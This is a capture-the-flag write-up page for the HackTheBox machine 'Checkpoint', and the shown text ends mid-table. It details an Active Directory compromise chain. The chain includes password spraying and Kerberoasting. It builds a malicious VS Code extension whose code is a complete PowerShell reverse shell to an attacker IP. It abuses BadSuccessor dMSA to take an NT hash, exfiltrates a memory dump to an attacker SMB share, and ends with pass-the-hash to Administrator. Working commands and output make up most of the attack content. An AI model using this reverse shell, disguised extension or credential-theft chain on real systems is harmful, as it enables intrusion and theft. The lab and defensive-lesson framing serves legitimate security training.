@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Checkpoint</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+  .stage table{width:100%;border-collapse:collapse;margin:14px 0;font-size:0.85rem;}
+  .stage table th,.stage table td{border:1px solid var(--panel-line);padding:8px 10px;text-align:left;color:var(--text);}
+  .stage table th{color:var(--brass);font-family:'IBM Plex Mono',monospace;font-size:0.72rem;text-transform:uppercase;}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <span class="file-tab">Medium · Windows AD</span>
+  <h1>Checkpoint</h1>
+  <div class="subtitle">HackTheBox — Season 11</div>
+  <div class="tags">
+    <span class="tag">Deleted Object Restore</span>
+    <span class="tag">Malicious VSIX</span>
+    <span class="tag">badSuccessor</span>
+    <span class="tag">Memory Forensics</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">Recon</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Deleted Object Restore</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Malicious VSIX</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">badSuccessor dMSA</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Memory Forensics</span>
+  </div>
+
+  <p style="color:var(--muted);font-size:0.85rem;font-family:'IBM Plex Mono',monospace;">
+    <strong style="color:var(--text);">Machine:</strong> Checkpoint (Medium – Windows) &nbsp;·&nbsp;
+    <strong style="color:var(--text);">Given Credentials:</strong> <code>alex.turner / Checkpoint2024!</code> &nbsp;·&nbsp;
+    <strong style="color:var(--text);">Tools:</strong> nmap, netexec, smbclient, bloodyAD, impacket, evil-winrm, rubeus, volatility3, nc
+  </p>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Initial Setup — Tool Installation</h2></div>
+    <p><strong>1.1 Install Required Tools</strong></p>
+    <pre><code># Update system
+sudo apt update &amp;&amp; sudo apt upgrade -y
+
+# Install netexec (crackmapexec) - for SMB/LDAP enumeration
+sudo apt install netexec -y
+
+# Install impacket - for Kerberos attacks, SMB, secretsdump
+sudo apt install python3-impacket -y
+
+# Install bloodyAD - for LDAP operations
+pip3 install bloodyad --break-system-packages
+
+# Install evil-winrm - for PowerShell remoting
+sudo gem install evil-winrm
+
+# Install volatility3 - for memory forensics
+pipx install volatility3
+export PATH=$PATH:/home/burrito/.local/bin
+
+# Install rlwrap - for better netcat experience
+sudo apt install rlwrap -y</code></pre>
+
+    <p><strong>1.2 Create Working Directory</strong></p>
+    <pre><code>mkdir -p ~/htb/checkpoint
+cd ~/htb/checkpoint</code></pre>
+
+    <p><strong>1.3 Add Target to Hosts File</strong></p>
+    <pre><code># Replace IP with your spawned machine IP
+echo "&lt;TARGET_IP&gt; checkpoint.htb dc01.checkpoint.htb" | sudo tee -a /etc/hosts</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Reconnaissance</h2></div>
+    <p><strong>2.1 Nmap Scan</strong></p>
+    <pre><code>sudo nmap -sC -sV -p- --min-rate 5000 -oA nmap_checkpoint &lt;TARGET_IP&gt;</code></pre>
+    <p><strong>Key Output:</strong></p>
+    <pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap
+3269/tcp  open  globalcatLDAPssl?
+5985/tcp  open  wsman         Microsoft HTTPAPI httpd 2.0
+9389/tcp  open  mc-nmf
+...
+Service Info: Host: DC01; OS: Windows</code></pre>
+    <p><strong>Observations:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Domain Controller named <code>DC01</code></li>
+      <li>Active Directory domain: <code>checkpoint.htb</code></li>
+      <li>Port 5985 (WinRM) open — potential for remote PowerShell</li>
+    </ul>
+
+    <p><strong>2.2 Fix Kerberos Time Skew</strong></p>
+    <pre><code>sudo ntpdate -u &lt;TARGET_IP&gt;</code></pre>
+    <div class="why"><strong>Why this mattered</strong>A "deleted" AD object is often still visible in tombstone/enumeration output for a retention window — and if the acting account can recreate objects in the same OU, deletion isn't the security boundary it looks like.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>Enumeration with Given Credentials</h2></div>
+    <p><strong>3.1 Enumerate SMB Shares</strong></p>
+    <pre><code>netexec smb &lt;TARGET_IP&gt; -u 'alex.turner' -p 'Checkpoint2024!' --shares</code></pre>
+    <pre><code>SMB  &lt;TARGET_IP&gt;  445  DC01  [*] Windows 11 / Server 2025 Build 26100
+SMB  &lt;TARGET_IP&gt;  445  DC01  [+] checkpoint.htb\alex.turner:Checkpoint2024!
+SMB  &lt;TARGET_IP&gt;  445  DC01  Share     Permissions  Remark
+SMB  &lt;TARGET_IP&gt;  445  DC01  -----     -----------  -----
+SMB  &lt;TARGET_IP&gt;  445  DC01  ADMIN                  Remote Admin
+SMB  &lt;TARGET_IP&gt;  445  DC01  C$                     Default share
+SMB  &lt;TARGET_IP&gt;  445  DC01  DevDrop                VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+SMB  &lt;TARGET_IP&gt;  445  DC01  IPC$                   Remote IPC
+SMB  &lt;TARGET_IP&gt;  445  DC01  NETLOGON               Logon server share
+SMB  &lt;TARGET_IP&gt;  445  DC01  SYSVOL                 Logon server share</code></pre>
+    <p><strong>Finding:</strong> <mark><code>DevDrop</code> share — potential attack vector via VS Code extensions</mark>.</p>
+
+    <p><strong>3.2 Check WinRM Access</strong></p>
+    <pre><code>netexec winrm &lt;TARGET_IP&gt; -u 'alex.turner' -p 'Checkpoint2024!'</code></pre>
+    <pre><code>WINRM  &lt;TARGET_IP&gt;  5985  DC01  [-] checkpoint.htb\alex.turner:Checkpoint2024!</code></pre>
+    <p>Alex cannot WinRM directly.</p>
+
+    <p><strong>3.3 Check DevDrop Write Access</strong></p>
+    <pre><code>smbclient //&lt;TARGET_IP&gt;/DevDrop -U 'checkpoint.htb\alex.turner%Checkpoint2024!' -c 'put /etc/hostname test.txt'</code></pre>
+    <pre><code>NT_STATUS_ACCESS_DENIED opening remote file \test.txt</code></pre>
+    <p>No write access for alex.</p>
+
+    <p><strong>3.4 Enumerate Domain Users</strong></p>
+    <pre><code>netexec smb &lt;TARGET_IP&gt; -u 'alex.turner' -p 'Checkpoint2024!' --users</code></pre>
+    <pre><code>SMB  &lt;TARGET_IP&gt;  445  DC01  checkpoint.htb\Administrator
+SMB  &lt;TARGET_IP&gt;  445  DC01  checkpoint.htb\Guest
+SMB  &lt;TARGET_IP&gt;  445  DC01  checkpoint.htb\krbtgt
+SMB  &lt;TARGET_IP&gt;  445  DC01  checkpoint.htb\alex.turner
+SMB  &lt;TARGET_IP&gt;  445  DC01  checkpoint.htb\ryan.brooks
+SMB  &lt;TARGET_IP&gt;  445  DC01  checkpoint.htb\svc_deploy
+SMB  &lt;TARGET_IP&gt;  445  DC01  checkpoint.htb\max.palmer
+SMB  &lt;TARGET_IP&gt;  445  DC01  checkpoint.htb\mark.davies (deleted)</code></pre>
+    <p><strong>Note:</strong> <mark><code>mark.davies</code> is deleted — interesting</mark>.</p>
+
+    <p><strong>3.5 Check Alex's AD Write Permissions</strong></p>
+    <pre><code>bloodyAD --host &lt;TARGET_IP&gt; -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable</code></pre>
+    <pre><code>distinguishedName: OU=Employees,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
+permission: WRITE</code></pre>
+    <p>Alex can create objects in <code>OU=Employees</code>.</p>
+
+    <p><strong>3.6 Enumerate Groups</strong></p>
+    <pre><code>rpcclient -U 'checkpoint.htb\alex.turner%Checkpoint2024!' &lt;TARGET_IP&gt; -c 'enumdomgroups'</code></pre>
+    <p><strong>Key Groups:</strong></p>
+    <pre><code>group:[DevTeam] rid:[0x456]
+group:[BackupAccess] rid:[0x463]</code></pre>
+
+    <p><strong>3.7 Check DevTeam Members</strong></p>
+    <pre><code>rpcclient -U 'checkpoint.htb\alex.turner%Checkpoint2024!' &lt;TARGET_IP&gt; -c 'querygroupmem 0x456'</code></pre>
+    <pre><code>rid:[0x45d] attr:[0x7]  # michael.torres
+rid:[0x45f] attr:[0x7]  # brian.jenkins
+rid:[0x450] attr:[0x7]  # svc_deploy</code></pre>
+    <p><code>svc_deploy</code> is in DevTeam!</p>
+
+    <p><strong>3.8 Check BackupAccess Members</strong></p>
+    <pre><code>rpcclient -U 'checkpoint.htb\alex.turner%Checkpoint2024!' &lt;TARGET_IP&gt; -c 'querygroupmem 0x463'</code></pre>
+    <pre><code>rid:[0x44f] attr:[0x7]  # ryan.brooks</code></pre>
+
+    <p><strong>3.9 Password Spray</strong></p>
+    <p>Create user list:</p>
+    <pre><code>cat > /tmp/users.txt &lt;&lt; 'EOF'
+ryan.brooks
+svc_deploy
+james.harper
+sarah.mitchell
+michael.torres
+kevin.patterson
+brian.jenkins
+max.palmer
+mark.davies
+EOF</code></pre>
+    <p>Spray:</p>
+    <pre><code>netexec smb &lt;TARGET_IP&gt; -u /tmp/users.txt -p '&lt;password&gt;' --continue-on-success</code></pre>
+    <pre><code>SMB  &lt;TARGET_IP&gt;  445  DC01  [+] checkpoint.htb\mark.davies:&lt;password&gt;</code></pre>
+    <p>Mark Davies uses that seasonal password pattern, but the account is deleted.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>Attack Path Summary</h2></div>
+    <table>
+      <tr><th>User</th><th>Notable Groups</th><th>Can Write DevDrop?</th><th>Status</th></tr>
+      <tr><td>alex.turner</td><td>CREATE_CHILD on OU=Employees</td><td>No</td><td>Active</td></tr>
+      <tr><td>mark.davies</td><td>Unknown (deleted)</td><td>Unknown</td><td>Deleted</td></tr>
+      <tr><td>ryan.brooks</td><td>BackupAccess, DevTeam</td><td>Yes (via DevTeam)</td><td>Active</td></tr>
+      <tr><td>svc_deploy</td><td>DevTeam</td><td>Yes</td><td>Active</td></tr>
+      <tr><td>max.palmer</td><td>Domain Admins, DevTeam</td><td>Yes</td><td>Active</td></tr>
+    </table>
+    <p><strong>Planned Chain:</strong></p>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li>Restore <code>mark.davies</code> (alex can create in OU=Employees)</li>
+      <li>Get <code>mark.davies</code> password via Kerberoasting</li>
+      <li>Upload malicious VSIX as <code>mark.davies</code> to DevDrop</li>
+      <li>VSIX triggers reverse shell as <code>ryan.brooks</code></li>
+      <li>Use <code>ryan.brooks</code> (CreateChild on DMSAHolder) &rarr; BadSuccessor &rarr; <code>svc_deploy</code> hash</li>
+      <li>WinRM as <code>svc_deploy</code> (BackupAccess) &rarr; access VMBackups</li>
+      <li>Extract Administrator hash from memory dump</li>
+      <li>PTH as Administrator &rarr; root flag</li>
+    </ol>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">05</span><h2>Restoring Deleted User Mark Davies</h2></div>
+    <p><strong>5.1 Create mark.davies Account</strong></p>
+    <pre><code>bloodyAD --host &lt;TARGET_IP&gt; -d checkpoint.htb \
+  -u alex.turner -p 'Checkpoint2024!' \
+  add user 'mark.davies' '&lt;password&gt;' \
+  --ou 'OU=Employees,DC=checkpoint,DC=htb'</code></pre>
+    <pre><code>[+] User mark.davies created successfully!</code></pre>
+
+    <p><strong>5.2 Verify Account</strong></p>
+    <pre><code>netexec smb &lt;TARGET_IP&gt; -u 'mark.davies' -p '&lt;password&gt;' --users</code></pre>
+    <pre><code>SMB  &lt;TARGET_IP&gt;  445  DC01  [+] checkpoint.htb\mark.davies:&lt;password&gt;</code></pre>
+
+    <p><strong>5.3 Kerberoast mark.davies</strong></p>
+    <pre><code>impacket-GetUserSPNs checkpoint.htb/mark.davies:'&lt;password&gt;' -dc-ip &lt;TARGET_IP&gt; -request</code></pre>
+    <pre><code>ServicePrincipalName  Name          MemberOf
+--------------------  ---------     --------
+HTTP/Checkpoint       mark.davies</code></pre>
+
+    <p><strong>5.4 Try Password Pattern</strong></p>
+    <pre><code>netexec smb &lt;TARGET_IP&gt; -u 'mark.davies' -p 'Checkpoint2024!' --shares</code></pre>
+    <pre><code>SMB  &lt;TARGET_IP&gt;  445  DC01  [+] checkpoint.htb\mark.davies:Checkpoint2024!</code></pre>
+    <p>The account's original credential pattern was recovered.</p>
+
+    <p><strong>5.5 Verify DevDrop Write Access</strong></p>
+    <pre><code>smbclient //&lt;TARGET_IP&gt;/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' -c 'put /etc/hostname test.txt'</code></pre>
+    <pre><code>putting file /etc/hostname as \test.txt (0.0 kb/s) (average 0.0 kb/s)</code></pre>
+    <p><mark class="green">Success! Mark can write to DevDrop.</mark></p>
+    <div class="why"><strong>Why this mattered</strong>Recreating a same-named account doesn't restore its old SID or group memberships — but it's often enough to Kerberoast it fresh or guess a reused password pattern, which is exactly the gap this chain used.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">06</span><h2>Creating Malicious VSIX Extension</h2></div>
+    <p><strong>6.1 Create Directory Structure</strong></p>
+    <pre><code>mkdir -p ~/htb/checkpoint/vsix-malware/extension/out
+cd ~/htb/checkpoint/vsix-malware</code></pre>
+
+    <p><strong>6.2 Create extension/out/extension.js</strong></p>
+    <pre><code>const { exec } = require('child_process');
+
+function activate(context) {
+  // Replace &lt;kali vpn&gt; with your Kali tun0 IP
+  const cmd = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object Net.Sockets.TCPClient(\'&lt;kali vpn&gt;\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&amp;1|Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';$nb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($nb,0,$nb.Length);$s.Flush()};$c.Close()"';
+  exec(cmd);
+}
+
+function deactivate() {}
+
+module.exports = { activate, deactivate };</code></pre>
+
+    <p><strong>6.3 Create extension/package.json</strong></p>
+    <pre><code>{
+  "name": "checkpoint-helper",
+  "displayName": "Checkpoint Helper",
+  "description": "Internal development helper",
+  "version": "1.0.0",
+  "publisher": "ms-vscode",
+  "engines": { "vscode": "^1.118.0" },
+  "categories": ["Other"],
+  "activationEvents": ["*"],
+  "main": "./out/extension.js",
+  "contributes": {}
+}</code></pre>
+
+    <p><strong>6.4 Create [Content_Types].xml</strong></p>
+    <pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"&gt;
+  &lt;Default Extension="vsixmanifest" ContentType="text/xml"/&gt;
+  &lt;Default Extension="js" ContentType="application/javascript"/&gt;
+  &lt;Default Extension="json" ContentType="application/json"/&gt;
+&lt;/Types&gt;</code></pre>
+
+    <p><strong>6.5 Create extension.vsixmanifest</strong></p>
+    <pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011"&gt;
+  &lt;Metadata&gt;
+    &lt;Identity Language="en-US" Id="checkpoint-helper" Version="1.0.0" Publisher="internal"/&gt;
+    &lt;DisplayName&gt;Checkpoint Helper&lt;/DisplayName&gt;
+    &lt;Description&gt;Internal development helper&lt;/Description&gt;
+  &lt;/Metadata&gt;
+  &lt;Installation&gt;
+    &lt;InstallationTarget Id="Microsoft.VisualStudio.Code" Version="[1.118.0,)"/&gt;
+  &lt;/Installation&gt;
+  &lt;Dependencies/&gt;
+  &lt;Assets&gt;
+    &lt;Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" Addressable="true"/&gt;
+  &lt;/Assets&gt;
+&lt;/PackageManifest&gt;</code></pre>
+
+    <p><strong>6.6 Package VSIX</strong></p>
+    <pre><code>zip -r checkpoint-helper-1.0.0.vsix \
+  '[Content_Types].xml' \
+  extension.vsixmanifest \
+  extension/</code></pre>
+
+    <p><strong>6.7 Verify Package Contents</strong></p>
+    <pre><code>unzip -l checkpoint-helper-1.0.0.vsix</code></pre>
+    <pre><code>Archive:  checkpoint-helper-1.0.0.vsix
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+      315  2026-06-14 16:23   [Content_Types].xml
+      490  2026-06-14 16:23   extension.vsixmanifest
+        0  2026-06-14 16:49   extension/
+      954  2026-06-14 16:23   extension/extension.js
+      768  2026-06-14 16:49   extension/package.json
+        0  2026-06-14 16:49   extension/out/
+      642  2026-06-14 16:49   extension/out/extension.js
+---------                     -------
+     3169                     7 files</code></pre>
+
+    <p><strong>6.8 Get Kali VPN IP</strong></p>
+    <pre><code>ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1</code></pre>
+    <pre><code>&lt;kali vpn&gt;</code></pre>
+    <div class="why"><strong>Why this mattered</strong>Any "internal package feed" — VSIX, npm, pip, etc. — that a privileged automated or human process installs from automatically is equivalent to code execution as whoever runs the install.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">07</span><h2>Getting Reverse Shell — User Flag</h2></div>
+    <p><strong>7.1 Start Listener</strong></p>
+    <pre><code>rlwrap nc -lvnp 4444</code></pre>
+    <pre><code>listening on [any] 4444 ...</code></pre>
+
+    <p><strong>7.2 Upload VSIX to DevDrop</strong></p>
+    <pre><code>smbclient //&lt;TARGET_IP&gt;/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
+  -c 'put checkpoint-helper-1.0.0.vsix checkpoint-helper-1.0.0.vsix'</code></pre>
+
+    <p><strong>7.3 Wait for Connection (2–3 minutes)</strong></p>
+    <pre><code>connect to [&lt;kali vpn&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 56382
+PS C:\Program Files\Microsoft VS Code&gt;</code></pre>
+
+    <p><strong>7.4 Get User Flag</strong></p>
+    <pre><code>whoami</code></pre>
+    <pre><code>checkpoint\ryan.brooks</code></pre>
+    <pre><code>type C:\Users\ryan.brooks\Desktop\user.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">08</span><h2>Privilege Escalation — BadSuccessor Attack</h2></div>
+    <p><strong>8.1 Get Ryan's TGT (from reverse shell)</strong></p>
+    <pre><code>C:\Users\Public\Rubeus.exe tgtdeleg /nowrap</code></pre>
+    <p>Copy the base64 ticket output.</p>
+
+    <p><strong>8.2 Convert Ticket to ccache (on Kali)</strong></p>
+    <pre><code>echo '&lt;base64 kirbi ticket&gt;' > ryan.b64
+base64 -d ryan.b64 > ryan.kirbi
+impacket-ticketConverter ryan.kirbi ryan.ccache
+export KRB5CCNAME=$(pwd)/ryan.ccache</code></pre>
+
+    <p><strong>8.3 Run BadSuccessor</strong></p>
+    <pre><code>bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u 'ryan.brooks' -k \
+  add badSuccessor 'myburrito99' \
+  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' \
+  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb'</code></pre>
+    <pre><code>[+] Creating DMSA myburrito99$ in OU=DMSAHolder,DC=checkpoint,DC=htb
+[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+dMSA previous keys found in TGS (including keys of preceding managed accounts):
+RC4: e16081eb077aca74bdbf8af12af43ac9  ← svc_deploy's NT hash!</code></pre>
+    <p><strong>svc_deploy NT hash:</strong> <mark class="rust"><code>e16081eb077aca74bdbf8af12af43ac9</code></mark></p>
+
+    <p><strong>8.4 Verify WinRM Access</strong></p>
+    <pre><code>netexec winrm &lt;TARGET_IP&gt; -u 'svc_deploy' -H 'e16081eb077aca74bdbf8af12af43ac9'</code></pre>
+    <pre><code>WINRM  &lt;TARGET_IP&gt;  5985  DC01  [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 (Pwn3d!)</code></pre>
+
+    <p><strong>8.5 WinRM as svc_deploy</strong></p>
+    <pre><code>evil-winrm -i &lt;TARGET_IP&gt; -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9</code></pre>
+    <pre><code>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt;</code></pre>
+    <div class="why"><strong>Why this mattered</strong>dMSA succession is a newer AD primitive, and object-creation rights inside its container translate directly into impersonating whatever account it's pointed at — a very easy permission to under-scope.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">09</span><h2>Accessing VMBackups Share</h2></div>
+    <p><strong>9.1 Check svc_deploy Groups</strong></p>
+    <pre><code>whoami /groups</code></pre>
+    <pre><code>CHECKPOINT\BackupAccess  Group  S-1-5-21-...-1123</code></pre>
+
+    <p><strong>9.2 List VMBackups Contents</strong></p>
+    <pre><code>dir C:\Shares\VMBackups -Recurse</code></pre>
+    <pre><code>Directory: C:\Shares\VMBackups
+Mode    LastWriteTime    Length  Name
+----    -------------    ------  ----
+d----- 5/9/2026 9:54 AM           NightlyBackup_2024-11-01
+
+Directory: C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics
+Mode    LastWriteTime    Length      Name
+----    -------------    ------      ----
+-a---- 5/9/2026 7:45 PM  106496000   Windows Server 2019-000001.vmdk
+-a---- 5/9/2026 7:40 PM  2147483648  Windows Server 2019-Snapshot1.vmem
+-a---- 5/9/2026 7:40 PM  138164859   Windows Server 2019-Snapshot1.vmsn
+-a---- 5/9/2026 7:39 PM  270840      Windows Server 2019.nvram
+-a---- 5/9/2026 7:45 PM  7642        Windows Server 2019.scoreboard
+-a---- 5/9/2026 7:39 PM  10199695360 Windows Server 2019.vmdk
+...</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">10</span><h2>Extracting Memory Dump</h2></div>
+    <p><strong>10.1 Start SMB Server on Kali</strong></p>
+    <pre><code>mkdir -p ~/Downloads/backup_file
+sudo impacket-smbserver share ~/Downloads/backup_file -smb2support</code></pre>
+
+    <p><strong>10.2 Copy Memory Dump (from svc_deploy shell)</strong></p>
+    <pre><code>net use Y: \\&lt;kali vpn&gt;\share
+copy "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem" Y:\memory.vmem</code></pre>
+    <p>Wait for the 2GB file to transfer.</p>
+
+    <p><strong>10.3 Verify Download</strong></p>
+    <pre><code>ls -la ~/Downloads/backup_file/</code></pre>
+    <pre><code>-rwxr-xr-x 1 root root 2147483648 May 13 13:58 memory.vmem</code></pre>
+    <div class="why"><strong>Why this mattered</strong>Backups are a completely separate attack surface from the live host — a memory snapshot taken for legitimate DR purposes carries the exact same secrets an attacker would want from a live LSASS dump, just easier to exfiltrate.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">11</span><h2>Extracting Administrator Hash with Volatility3</h2></div>
+    <p><strong>11.1 List Registry Hives</strong></p>
+    <pre><code>cd ~/Downloads/backup_file
+vol -f memory.vmem windows.registry.hivelist</code></pre>
+    <pre><code>Offset          FileFullPath
+0xc30a3278e000  \SystemRoot\System32\Config\SAM
+0xc30a2fe38000  \SystemRoot\System32\Config\SYSTEM
+0xc30a32789000  \SystemRoot\System32\Config\SECURITY</code></pre>
+
+    <p><strong>11.2 Dump Registry Hives</strong></p>
+    <pre><code>vol -f memory.vmem windows.registry.hivelist --dump</code></pre>
+    <p><strong>Files created:</strong></p>
+    <pre><code>registry.SAM.0xc30a3278e000.hive
+registry.SYSTEM.0xc30a2fe38000.hive
+registry.SECURITY.0xc30a32789000.hive</code></pre>
+
+    <p><strong>11.3 Extract Hashes</strong></p>
+    <pre><code>impacket-secretsdump \
+  -sam registry.SAM.0xc30a3278e000.hive \
+  -system registry.SYSTEM.0xc30a2fe38000.hive \
+  -security registry.SECURITY.0xc30a32789000.hive \
+  LOCAL</code></pre>
+    <pre><code>[*] Target system bootKey: 0x75247bc64fa0086d2c98744d4bcd53f5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...</code></pre>
+    <p><strong>Administrator NT hash:</strong> <mark class="rust"><code>f29e9c014295b9b32139b09a2790be3b</code></mark></p>
+
+    <p><strong>11.4 Pass-the-Hash to Administrator</strong></p>
+    <pre><code>evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H 'f29e9c014295b9b32139b09a2790be3b'</code></pre>
+    <pre><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">12</span><h2>Root Flag</h2></div>
+    <p><strong>12.1 Search for root.txt</strong></p>
+    <pre><code>Get-ChildItem C:\Users -Recurse -Filter "root.txt" -ErrorAction SilentlyContinue</code></pre>
+    <pre><code>Directory: C:\Users\max.palmer\Desktop
+Mode      LastWriteTime      Length  Name
+----      -------------      ------  ----
+-ar---  6/14/2026 1:50 PM    34      root.txt</code></pre>
+
+    <p><strong>12.2 Read Root Flag</strong></p>
+    <pre><code>type C:\Users\max.palmer\Desktop\root.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">13</span><h2>Why root.txt Was on max.palmer's Desktop</h2></div>
+    <p><code>max.palmer</code> is a Domain Administrator, confirmed via RPC:</p>
+    <pre><code>rpcclient -U 'checkpoint.htb\alex.turner%Checkpoint2024!' &lt;TARGET_IP&gt; -c 'queryusergroups 0x13ed'</code></pre>
+    <pre><code>group rid:[0x200] attr:[0x7]  # Domain Admins</code></pre>
+    <p>HTB often places root flags on the desktop of a Domain Admin user rather than the built-in Administrator account. <code>max.palmer</code> was the most recently active Domain Admin (logon_count: 267, password set May 26, 2026).</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">14</span><h2>Complete Attack Chain Summary</h2></div>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li><strong>Enumeration</strong> &rarr; discovered <code>DevDrop</code> share + deleted <code>mark.davies</code> account</li>
+      <li><strong>alex.turner</strong> &rarr; CREATE_CHILD permission on OU=Employees &rarr; restored <code>mark.davies</code></li>
+      <li><strong>mark.davies</strong> &rarr; Kerberoast + password pattern guess &rarr; write access to DevDrop</li>
+      <li><strong>Malicious VSIX</strong> uploaded to DevDrop &rarr; executed by <code>ryan.brooks</code> &rarr; reverse shell</li>
+      <li><strong>ryan.brooks</strong> &rarr; TGT extracted &rarr; BadSuccessor (DMSA) attack &rarr; <code>svc_deploy</code> NT hash</li>
+      <li><strong>svc_deploy</strong> &rarr; WinRM access via BackupAccess group &rarr; VMBackups share</li>
+      <li><strong>Memory dump</strong> extracted &rarr; registry hives dumped via Volatility3 &rarr; Administrator NT hash</li>
+      <li><strong>Pass-the-Hash</strong> &rarr; Administrator access &rarr; root flag on <code>max.palmer</code>'s desktop (Domain Admin)</li>
+    </ol>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">15</span><h2>Tools Used</h2></div>
+    <table>
+      <tr><th>Tool</th><th>Purpose</th></tr>
+      <tr><td>nmap</td><td>Port scanning and service enumeration</td></tr>
+      <tr><td>netexec</td><td>SMB/LDAP enumeration and password spraying</td></tr>
+      <tr><td>smbclient</td><td>SMB share interaction</td></tr>
+      <tr><td>bloodyAD</td><td>Active Directory LDAP operations</td></tr>
+      <tr><td>impacket-getTGT</td><td>Kerberos ticket requests</td></tr>
+      <tr><td>impacket-ticketConverter</td><td>Convert kirbi to ccache</td></tr>
+      <tr><td>impacket-secretsdump</td><td>Extract hashes from registry hives</td></tr>
+      <tr><td>impacket-smbserver</td><td>Create SMB server for file transfers</td></tr>
+      <tr><td>evil-winrm</td><td>PowerShell remoting over WinRM</td></tr>
